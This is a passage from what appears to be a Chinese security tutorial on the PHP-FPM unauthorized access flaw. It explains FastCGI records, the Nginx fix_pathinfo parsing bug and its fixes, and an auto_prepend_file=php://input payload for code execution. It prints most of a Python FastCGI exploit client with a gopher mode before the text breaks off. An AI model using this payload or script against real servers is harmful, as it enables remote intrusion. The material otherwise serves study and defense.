valueLengthB0;\nunsigned char nameData[nameLength];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair14;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB0; /* valueLengthB0 &gt;&gt; 7 == 0 */\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength];\n} FCGI_NameValuePair41;\n\ntypedef struct {\nunsigned char nameLengthB3;  /* nameLengthB3  &gt;&gt; 7 == 1 */\nunsigned char nameLengthB2;\nunsigned char nameLengthB1;\nunsigned char nameLengthB0;\nunsigned char valueLengthB3; /* valueLengthB3 &gt;&gt; 7 == 1 */\nunsigned char valueLengthB2;\nunsigned char valueLengthB1;\nunsigned char valueLengthB0;\nunsigned char nameData[nameLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\nunsigned char valueData[valueLength\n((B3 &amp; 0x7f) &lt;&lt; 24) + (B2 &lt;&lt; 16) + (B1 &lt;&lt; 8) + B0];\n} FCGI_NameValuePair44;\n</code></pre> <p>\u8fd9\u5176\u5b9e\u662f4\u4e2a\u7ed3\u6784\uff0c\u81f3\u4e8e\u7528\u54ea\u4e2a\u7ed3\u6784\uff0c\u6709\u5982\u4e0b\u89c4\u5219\uff1a</p> <ol> <li>key\u3001value\u5747\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair11</code></li> <li>key\u5927\u4e8e128\u5b57\u8282\uff0cvalue\u5c0f\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair41</code></li> <li>key\u5c0f\u4e8e128\u5b57\u8282\uff0cvalue\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair14</code></li> <li>key\u3001value\u5747\u5927\u4e8e128\u5b57\u8282\uff0c\u7528<code>FCGI_NameValuePair44</code></li> </ol> <p>\u4e3a\u4ec0\u4e48\u6211\u53ea\u4ecb\u7ecd<code>type</code>\u4e3a4\u7684record\uff1f\u56e0\u4e3a\u73af\u5883\u53d8\u91cf\u5728\u540e\u9762PHP-FPM\u91cc\u6709\u91cd\u8981\u4f5c\u7528\uff0c\u4e4b\u540e\u5199\u4ee3\u7801\u4e5f\u4f1a\u5199\u5230\u8fd9\u4e2a\u7ed3\u6784\u3002<code>type</code>\u7684\u5176\u4ed6\u60c5\u51b5\uff0c\u5927\u5bb6\u53ef\u4ee5\u81ea\u5df1\u7ffb\u6587\u6863\u7406\u89e3\u7406\u89e3\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#php-fpm_1","title":"PHP-FPM","text":"<p>FPM\u5176\u5b9e\u662f\u4e00\u4e2afastcgi\u534f\u8bae\u89e3\u6790\u5668\uff0cNginx\u7b49\u670d\u52a1\u5668\u4e2d\u95f4\u4ef6\u5c06\u7528\u6237\u8bf7\u6c42\u6309\u7167fastcgi\u7684\u89c4\u5219\u6253\u5305\u597d\u901a\u8fc7TCP\u4f20\u7ed9\u8c01\uff1f\u5176\u5b9e\u5c31\u662f\u4f20\u7ed9FPM\u3002</p> <p>FPM\u6309\u7167fastcgi\u7684\u534f\u8bae\u5c06TCP\u6d41\u89e3\u6790\u6210\u771f\u6b63\u7684\u6570\u636e\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/index.php?a=1&amp;b=2</code>\uff0c\u5982\u679cweb\u76ee\u5f55\u662f<code>/var/www/html</code>\uff0c\u90a3\u4e48Nginx\u4f1a\u5c06\u8fd9\u4e2a\u8bf7\u6c42\u53d8\u6210\u5982\u4e0bkey-value\u5bf9\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n}\n</code></pre> <p>\u8fd9\u4e2a\u6570\u7ec4\u5176\u5b9e\u5c31\u662fPHP\u4e2d<code>$_SERVER</code>\u6570\u7ec4\u7684\u4e00\u90e8\u5206\uff0c\u4e5f\u5c31\u662fPHP\u91cc\u7684\u73af\u5883\u53d8\u91cf\u3002\u4f46\u73af\u5883\u53d8\u91cf\u7684\u4f5c\u7528\u4e0d\u4ec5\u662f\u586b\u5145<code>$_SERVER</code>\u6570\u7ec4\uff0c\u4e5f\u662f\u544a\u8bc9fpm\uff1a\u201c\u6211\u8981\u6267\u884c\u54ea\u4e2aPHP\u6587\u4ef6\u201d\u3002</p> <p>PHP-FPM\u62ff\u5230fastcgi\u7684\u6570\u636e\u5305\u540e\uff0c\u8fdb\u884c\u89e3\u6790\uff0c\u5f97\u5230\u4e0a\u8ff0\u8fd9\u4e9b\u73af\u5883\u53d8\u91cf\u3002\u7136\u540e\uff0c\u6267\u884c<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5411\u7684PHP\u6587\u4ef6\uff0c\u4e5f\u5c31\u662f<code>/var/www/html/index.php</code>\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#nginxiis7","title":"Nginx\uff08IIS7\uff09\u89e3\u6790\u6f0f\u6d1e","text":"<p>Nginx\u548cIIS7\u66fe\u7ecf\u51fa\u73b0\u8fc7\u4e00\u4e2aPHP\u76f8\u5173\u7684\u89e3\u6790\u6f0f\u6d1e\uff08\u6d4b\u8bd5\u73af\u5883<code>https://github.com/phith0n/vulhub/tree/master/nginx_parsing_vulnerability</code>\uff09\uff0c\u8be5\u6f0f\u6d1e\u73b0\u8c61\u662f\uff0c\u5728\u7528\u6237\u8bbf\u95ee<code>http://127.0.0.1/favicon.ico/.php</code>\u65f6\uff0c\u8bbf\u95ee\u5230\u7684\u6587\u4ef6\u662ffavicon.ico\uff0c\u4f46\u5374\u6309\u7167.php\u540e\u7f00\u89e3\u6790\u4e86\u3002</p> <p>\u7528\u6237\u8bf7\u6c42<code>http://127.0.0.1/favicon.ico/.php</code>\uff0cnginx\u5c06\u4f1a\u53d1\u9001\u5982\u4e0b\u73af\u5883\u53d8\u91cf\u5230fpm\u91cc\uff1a</p> <pre><code>{\n...\n'SCRIPT_FILENAME': '/var/www/html/favicon.ico/.php',\n'SCRIPT_NAME': '/favicon.ico/.php',\n'REQUEST_URI': '/favicon.ico/.php',\n'DOCUMENT_ROOT': '/var/www/html',\n...\n}\n</code></pre> <p>\u6b63\u5e38\u6765\u8bf4\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u662f\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6<code>/var/www/html/favicon.ico/.php</code>\uff0c\u662fPHP\u8bbe\u7f6e\u4e2d\u7684\u4e00\u4e2a\u9009\u9879<code>fix_pathinfo</code>\u5bfc\u81f4\u4e86\u8fd9\u4e2a\u6f0f\u6d1e\u3002PHP\u4e3a\u4e86\u652f\u6301Path Info\u6a21\u5f0f\u800c\u521b\u9020\u4e86<code>fix_pathinfo</code>\uff0c\u5728\u8fd9\u4e2a\u9009\u9879\u88ab\u6253\u5f00\u7684\u60c5\u51b5\u4e0b\uff0cfpm\u4f1a\u5224\u65ad<code>SCRIPT_FILENAME</code>\u662f\u5426\u5b58\u5728\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u5219\u53bb\u6389\u6700\u540e\u4e00\u4e2a<code>/</code>\u53ca\u4ee5\u540e\u7684\u6240\u6709\u5185\u5bb9\uff0c\u518d\u6b21\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff0c\u5f80\u6b21\u5faa\u73af\uff0c\u76f4\u5230\u6587\u4ef6\u5b58\u5728\u3002</p> <p>\u6240\u4ee5\uff0c\u7b2c\u4e00\u6b21fpm\u53d1\u73b0<code>/var/www/html/favicon.ico/.php</code>\u4e0d\u5b58\u5728\uff0c\u5219\u53bb\u6389<code>/.php</code>\uff0c\u518d\u5224\u65ad<code>/var/www/html/favicon.ico</code>\u662f\u5426\u5b58\u5728\u3002\u663e\u7136\u8fd9\u4e2a\u6587\u4ef6\u662f\u5b58\u5728\u7684\uff0c\u4e8e\u662f\u88ab\u4f5c\u4e3aPHP\u6587\u4ef6\u6267\u884c\uff0c\u5bfc\u81f4\u89e3\u6790\u6f0f\u6d1e\u3002</p> <p>\u6b63\u786e\u7684\u89e3\u51b3\u65b9\u6cd5\u6709\u4e24\u79cd\uff0c\u4e00\u662f\u5728Nginx\u7aef\u4f7f\u7528<code>fastcgi_split_path_info</code>\u5c06path info\u4fe1\u606f\u53bb\u9664\u540e\uff0c\u7528tryfiles\u5224\u65ad\u6587\u4ef6\u662f\u5426\u5b58\u5728\uff1b\u4e8c\u662f\u501f\u52a9PHP-FPM\u7684<code>security.limit_extensions</code>\u914d\u7f6e\u9879\uff0c\u907f\u514d\u5176\u4ed6\u540e\u7f00\u6587\u4ef6\u88ab\u89e3\u6790\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#securitylimit_extensions","title":"<code>security.limit_extensions</code>\u914d\u7f6e","text":"<p>\u5199\u5230\u8fd9\u91cc\uff0cPHP-FPM\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\u4e5f\u5c31\u547c\u4e4b\u6b32\u51fa\u4e86\u3002PHP-FPM\u9ed8\u8ba4\u76d1\u542c9000\u7aef\u53e3\uff0c\u5982\u679c\u8fd9\u4e2a\u7aef\u53e3\u66b4\u9732\u5728\u516c\u7f51\uff0c\u5219\u6211\u4eec\u53ef\u4ee5\u81ea\u5df1\u6784\u9020fastcgi\u534f\u8bae\uff0c\u548cfpm\u8fdb\u884c\u901a\u4fe1\u3002</p> <p>\u6b64\u65f6\uff0c<code>SCRIPT_FILENAME</code>\u7684\u503c\u5c31\u683c\u5916\u91cd\u8981\u4e86\u3002\u56e0\u4e3afpm\u662f\u6839\u636e\u8fd9\u4e2a\u503c\u6765\u6267\u884cphp\u6587\u4ef6\u7684\uff0c\u5982\u679c\u8fd9\u4e2a\u6587\u4ef6\u4e0d\u5b58\u5728\uff0cfpm\u4f1a\u76f4\u63a5\u8fd4\u56de404\uff1a</p> <p></p> <p>\u5728fpm\u67d0\u4e2a\u7248\u672c\u4e4b\u524d\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06<code>SCRIPT_FILENAME</code>\u7684\u503c\u6307\u5b9a\u4e3a\u4efb\u610f\u540e\u7f00\u6587\u4ef6\uff0c\u6bd4\u5982<code>/etc/passwd</code>\uff1b\u4f46\u540e\u6765\uff0cfpm\u7684\u9ed8\u8ba4\u914d\u7f6e\u4e2d\u589e\u52a0\u4e86\u4e00\u4e2a\u9009\u9879<code>security.limit_extensions</code>\uff1a</p> <pre><code>; Limits the extensions of the main script FPM will allow to parse. This can\n; prevent configuration mistakes on the web server side. You should only limit\n; FPM to .php extensions to prevent malicious users to use other extensions to\n; exectute php code.\n; Note: set an empty value to allow all extensions.\n; Default Value: .php\n;security.limit_extensions = .php .php3 .php4 .php5 .php7\n</code></pre> <p>\u5176\u9650\u5b9a\u4e86\u53ea\u6709\u67d0\u4e9b\u540e\u7f00\u7684\u6587\u4ef6\u5141\u8bb8\u88abfpm\u6267\u884c\uff0c\u9ed8\u8ba4\u662f<code>.php</code>\u3002\u6240\u4ee5\uff0c\u5f53\u6211\u4eec\u518d\u4f20\u5165<code>/etc/passwd</code>\u7684\u65f6\u5019\uff0c\u5c06\u4f1a\u8fd4\u56de<code>Access denied.</code>\uff1a</p> <p></p> <p>ps. \u8fd9\u4e2a\u914d\u7f6e\u4e5f\u4f1a\u5f71\u54cdNginx\u89e3\u6790\u6f0f\u6d1e\uff0c\u6211\u89c9\u5f97\u5e94\u8be5\u662f\u56e0\u4e3aNginx\u5f53\u65f6\u90a3\u4e2a\u89e3\u6790\u6f0f\u6d1e\uff0c\u4fc3\u6210PHP-FPM\u589e\u52a0\u4e86\u8fd9\u4e2a\u5b89\u5168\u9009\u9879\u3002\u53e6\u5916\uff0c\u4e5f\u6709\u5c11\u90e8\u5206\u53d1\u884c\u7248\u5b89\u88c5\u4e2d<code>security.limit_extensions</code>\u9ed8\u8ba4\u4e3a\u7a7a\uff0c\u6b64\u65f6\u5c31\u6ca1\u6709\u4efb\u4f55\u9650\u5236\u4e86\u3002</p> <p>\u7531\u4e8e\u8fd9\u4e2a\u914d\u7f6e\u9879\u7684\u9650\u5236\uff0c\u5982\u679c\u60f3\u5229\u7528PHP-FPM\u7684\u672a\u6388\u6743\u8bbf\u95ee\u6f0f\u6d1e\uff0c\u9996\u5148\u5c31\u5f97\u627e\u5230\u4e00\u4e2a\u5df2\u5b58\u5728\u7684PHP\u6587\u4ef6\u3002</p> <p>\u4e07\u5e78\u7684\u662f\uff0c\u901a\u5e38\u4f7f\u7528\u6e90\u5b89\u88c5php\u7684\u65f6\u5019\uff0c\u670d\u52a1\u5668\u4e0a\u90fd\u4f1a\u9644\u5e26\u4e00\u4e9bphp\u540e\u7f00\u7684\u6587\u4ef6\uff0c\u6211\u4eec\u4f7f\u7528<code>find / -name \"*.php\"</code>\u6765\u5168\u5c40\u641c\u7d22\u4e00\u4e0b\u9ed8\u8ba4\u73af\u5883\uff1a</p> <p></p> <p>\u627e\u5230\u4e86\u4e0d\u5c11\u3002\u8fd9\u5c31\u7ed9\u6211\u4eec\u63d0\u4f9b\u4e86\u4e00\u6761\u601d\u8def\uff0c\u5047\u8bbe\u6211\u4eec\u7206\u7834\u4e0d\u51fa\u6765\u76ee\u6807\u73af\u5883\u7684web\u76ee\u5f55\uff0c\u6211\u4eec\u53ef\u4ee5\u627e\u627e\u9ed8\u8ba4\u6e90\u5b89\u88c5\u540e\u53ef\u80fd\u5b58\u5728\u7684php\u6587\u4ef6\uff0c\u6bd4\u5982<code>/usr/local/lib/php/PEAR.php</code>\u3002</p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#_1","title":"\u4efb\u610f\u4ee3\u7801\u6267\u884c","text":"<p>\u90a3\u4e48\uff0c\u4e3a\u4ec0\u4e48\u6211\u4eec\u63a7\u5236fastcgi\u534f\u8bae\u901a\u4fe1\u7684\u5185\u5bb9\uff0c\u5c31\u80fd\u6267\u884c\u4efb\u610fPHP\u4ee3\u7801\u5462\uff1f</p> <p>\u7406\u8bba\u4e0a\u5f53\u7136\u662f\u4e0d\u53ef\u4ee5\u7684\uff0c\u5373\u4f7f\u6211\u4eec\u80fd\u63a7\u5236<code>SCRIPT_FILENAME</code>\uff0c\u8ba9fpm\u6267\u884c\u4efb\u610f\u6587\u4ef6\uff0c\u4e5f\u53ea\u662f\u6267\u884c\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6\uff0c\u5e76\u4e0d\u80fd\u6267\u884c\u6211\u4eec\u9700\u8981\u5176\u6267\u884c\u7684\u6587\u4ef6\u3002</p> <p>\u4f46PHP\u662f\u4e00\u95e8\u5f3a\u5927\u7684\u8bed\u8a00\uff0cPHP.INI\u4e2d\u6709\u4e24\u4e2a\u6709\u8da3\u7684\u914d\u7f6e\u9879\uff0c<code>auto_prepend_file</code>\u548c<code>auto_append_file</code>\u3002</p> <p><code>auto_prepend_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u76ee\u6807\u6587\u4ef6\u4e4b\u524d\uff0c\u5148\u5305\u542b<code>auto_prepend_file</code>\u4e2d\u6307\u5b9a\u7684\u6587\u4ef6\uff1b<code>auto_append_file</code>\u662f\u544a\u8bc9PHP\uff0c\u5728\u6267\u884c\u5b8c\u6210\u76ee\u6807\u6587\u4ef6\u540e\uff0c\u5305\u542b<code>auto_append_file</code>\u6307\u5411\u7684\u6587\u4ef6\u3002</p> <p>\u90a3\u4e48\u5c31\u6709\u8da3\u4e86\uff0c\u5047\u8bbe\u6211\u4eec\u8bbe\u7f6e<code>auto_prepend_file</code>\u4e3a<code>php://input</code>\uff0c\u90a3\u4e48\u5c31\u7b49\u4e8e\u5728\u6267\u884c\u4efb\u4f55php\u6587\u4ef6\u524d\u90fd\u8981\u5305\u542b\u4e00\u904dPOST\u7684\u5185\u5bb9\u3002\u6240\u4ee5\uff0c\u6211\u4eec\u53ea\u9700\u8981\u628a\u5f85\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u4ed6\u4eec\u5c31\u80fd\u88ab\u6267\u884c\u4e86\u3002\uff08\u5f53\u7136\uff0c\u8fd8\u9700\u8981\u5f00\u542f\u8fdc\u7a0b\u6587\u4ef6\u5305\u542b\u9009\u9879<code>allow_url_include</code>\uff09</p> <p>\u90a3\u4e48\uff0c\u6211\u4eec\u600e\u4e48\u8bbe\u7f6e<code>auto_prepend_file</code>\u7684\u503c\uff1f</p> <p>\u8fd9\u53c8\u6d89\u53ca\u5230PHP-FPM\u7684\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\uff0c<code>PHP_VALUE</code>\u548c<code>PHP_ADMIN_VALUE</code>\u3002\u8fd9\u4e24\u4e2a\u73af\u5883\u53d8\u91cf\u5c31\u662f\u7528\u6765\u8bbe\u7f6ePHP\u914d\u7f6e\u9879\u7684\uff0c<code>PHP_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6a21\u5f0f\u4e3a<code>PHP_INI_USER</code>\u548c<code>PHP_INI_ALL</code>\u7684\u9009\u9879\uff0c<code>PHP_ADMIN_VALUE</code>\u53ef\u4ee5\u8bbe\u7f6e\u6240\u6709\u9009\u9879\u3002\uff08<code>disable_functions</code>\u9664\u5916\uff0c\u8fd9\u4e2a\u9009\u9879\u662fPHP\u52a0\u8f7d\u7684\u65f6\u5019\u5c31\u786e\u5b9a\u4e86\uff0c\u5728\u8303\u56f4\u5185\u7684\u51fd\u6570\u76f4\u63a5\u4e0d\u4f1a\u88ab\u52a0\u8f7d\u5230PHP\u4e0a\u4e0b\u6587\u4e2d\uff09</p> <p>\u6240\u4ee5\uff0c\u6211\u4eec\u6700\u540e\u4f20\u5165\u5982\u4e0b\u73af\u5883\u53d8\u91cf\uff1a</p> <pre><code>{\n'GATEWAY_INTERFACE': 'FastCGI/1.0',\n'REQUEST_METHOD': 'GET',\n'SCRIPT_FILENAME': '/var/www/html/index.php',\n'SCRIPT_NAME': '/index.php',\n'QUERY_STRING': '?a=1&amp;b=2',\n'REQUEST_URI': '/index.php?a=1&amp;b=2',\n'DOCUMENT_ROOT': '/var/www/html',\n'SERVER_SOFTWARE': 'php/fcgiclient',\n'REMOTE_ADDR': '127.0.0.1',\n'REMOTE_PORT': '12345',\n'SERVER_ADDR': '127.0.0.1',\n'SERVER_PORT': '80',\n'SERVER_NAME': \"localhost\",\n'SERVER_PROTOCOL': 'HTTP/1.1'\n'PHP_VALUE': 'auto_prepend_file = php://input',\n'PHP_ADMIN_VALUE': 'allow_url_include = On'\n}\n</code></pre> <p>\u8bbe\u7f6e<code>auto_prepend_file = php://input</code>\u4e14<code>allow_url_include = On</code>\uff0c\u7136\u540e\u5c06\u6211\u4eec\u9700\u8981\u6267\u884c\u7684\u4ee3\u7801\u653e\u5728Body\u4e2d\uff0c\u5373\u53ef\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</p> <p>\u6548\u679c\u5982\u4e0b\uff1a</p> <p></p>"},{"location":"web/%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E_%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/PHP/PHP-FPM%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/#exp","title":"EXP\u7f16\u5199","text":"<p>\u4e0a\u56fe\u4e2d\u7528\u5230\u7684EXP\uff0c\u5c31\u662f\u6839\u636e\u4e4b\u524d\u4ecb\u7ecd\u7684fastcgi\u534f\u8bae\u6765\u7f16\u5199\u7684\uff0c\u4ee3\u7801\u5982\u4e0b\uff1ahttps://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75 \u3002\u517c\u5bb9Python2\u548cPython3\uff0c\u65b9\u4fbf\u5728\u5185\u7f51\u7528\u3002</p> <p>\u4ee3\u7801\uff1a</p> <pre><code>import socket\nimport random\nimport argparse\nimport sys\nfrom io import BytesIO\nimport base64\nimport urllib\n# Referrer: https://github.com/wuyunfeng/Python-FastCGI-Client\nPY2 = True if sys.version_info.major == 2 else False\ndef bchr(i):\nif PY2:\nreturn force_bytes(chr(i))\nelse:\nreturn bytes([i])\ndef bord(c):\nif isinstance(c, int):\nreturn c\nelse:\nreturn ord(c)\ndef force_bytes(s):\nif isinstance(s, bytes):\nreturn s\nelse:\nreturn s.encode('utf-8', 'strict')\ndef force_text(s):\nif issubclass(type(s), str):\nreturn s\nif isinstance(s, bytes):\ns = str(s, 'utf-8', 'strict')\nelse:\ns = str(s)\nreturn s\nclass FastCGIClient:\n\"\"\"A Fast-CGI Client for Python\"\"\"\n# private\n__FCGI_VERSION = 1\n__FCGI_ROLE_RESPONDER = 1\n__FCGI_ROLE_AUTHORIZER = 2\n__FCGI_ROLE_FILTER = 3\n__FCGI_TYPE_BEGIN = 1\n__FCGI_TYPE_ABORT = 2\n__FCGI_TYPE_END = 3\n__FCGI_TYPE_PARAMS = 4\n__FCGI_TYPE_STDIN = 5\n__FCGI_TYPE_STDOUT = 6\n__FCGI_TYPE_STDERR = 7\n__FCGI_TYPE_DATA = 8\n__FCGI_TYPE_GETVALUES = 9\n__FCGI_TYPE_GETVALUES_RESULT = 10\n__FCGI_TYPE_UNKOWNTYPE = 11\n__FCGI_HEADER_SIZE = 8\n# request state\nFCGI_STATE_SEND = 1\nFCGI_STATE_ERROR = 2\nFCGI_STATE_SUCCESS = 3\ndef __init__(self, host, port, timeout, keepalive):\nself.host = host\nself.port = port\nself.timeout = timeout\nif keepalive:\nself.keepalive = 1\nelse:\nself.keepalive = 0\nself.sock = None\nself.requests = dict()\ndef __connect(self):\nself.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nself.sock.settimeout(self.timeout)\nself.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n# if self.keepalive:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)\n# else:\n#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)\ntry:\nself.sock.connect((self.host, int(self.port)))\nexcept socket.error as msg:\nself.sock.close()\nself.sock = None\nprint(repr(msg))\nreturn False\nreturn True\ndef __encodeFastCGIRecord(self, fcgi_type, content, requestid):\nlength = len(content)\nbuf = bchr(FastCGIClient.__FCGI_VERSION) \\\n+ bchr(fcgi_type) \\\n+ bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(requestid &amp; 0xFF) \\\n+ bchr((length &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(length &amp; 0xFF) \\\n+ bchr(0) \\\n+ bchr(0) \\\n+ content\nreturn buf\ndef __encodeNameValueParams(self, name, value):\nnLen = len(name)\nvLen = len(value)\nrecord = b''\nif nLen &lt; 128:\nrecord += bchr(nLen)\nelse:\nrecord += bchr((nLen &gt;&gt; 24) | 0x80) \\\n+ bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(nLen &amp; 0xFF)\nif vLen &lt; 128:\nrecord += bchr(vLen)\nelse:\nrecord += bchr((vLen &gt;&gt; 24) | 0x80) \\\n+ bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\\n+ bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\\n+ bchr(vLen &amp; 0xFF)\nreturn record + name + value\ndef __decodeFastCGIHeader(self, stream):\nheader = dict()\nheader['version'] = bord(stream[0])\nheader['type'] = bord(stream[1])\nheader['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3])\nheader['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5])\nheader['paddingLength'] = bord(stream[6])\nheader['reserved'] = bord(stream[7])\nreturn header\ndef __decodeFastCGIRecord(self, buffer):\nheader = buffer.read(int(self.__FCGI_HEADER_SIZE))\nif not header:\nreturn False\nelse:\nrecord = self.__decodeFastCGIHeader(header)\nrecord['content'] = b''\nif 'contentLength' in record.keys():\ncontentLength = int(record['contentLength'])\nrecord['content'] += buffer.read(contentLength)\nif 'paddingLength' in record.keys():\nskiped = buffer.read(int(record['paddingLength']))\nreturn record\ndef request(self, nameValuePairs={}, post=''):\nif not self.__connect():\nprint('connect failure! please check your fasctcgi-server !!')\nreturn\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nself.sock.send(request)\nself.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND\nself.requests[requestId]['response'] = b''\nreturn self.__waitForResponse(requestId)\ndef gopher(self, nameValuePairs={}, post=''):\nrequestId = random.randint(1, (1 &lt;&lt; 16) - 1)\nself.requests[requestId] = dict()\nrequest = b\"\"\nbeginFCGIRecordContent = bchr(0) \\\n+ bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\\n+ bchr(self.keepalive) \\\n+ bchr(0) * 5\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,\nbeginFCGIRecordContent, requestId)\nparamsRecord = b''\nif nameValuePairs:\nfor (name, value) in nameValuePairs.items():\nname = force_bytes(name)\nvalue = force_bytes(value)\nparamsRecord += self.__encodeNameValueParams(name, value)\nif paramsRecord:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId)\nif post:\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)\nrequest += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId)\nreturn request\ndef __waitForResponse(self, requestId):\ndata = b''\nwhile True:\nbuf = self.sock.recv(512)\nif not len(buf):\nbreak\ndata += buf\ndata = BytesIO(data)\nwhile True:\nresponse = self.__decodeFastCGIRecord(data)\nif not response:\nbreak\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\\nor response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nif response['type'] == FastCGIClient.__FCGI_TYPE_STDERR:\nself.requests['state'] = FastCGIClient.FCGI_STATE_ERROR\nif requestId == int(response['requestId']):\nself.requests[requestId]['response'] += response['content']\nif response['type'] == FastCGIClient.FCGI_STATE_SUCCESS:\nself.requests[requestId]\nreturn self.requests[requestId]['response']\ndef __repr__(self):\nreturn \"fastcgi connect host:{} port:{}\".format(self.host, self.port)\nif __name__ == '__main__':\nparser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.')\nparser.add_argument('host', help='Target host, such as 127.0.0.1')\nparser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php')\nparser.add_argument('-c', '--code', help='What 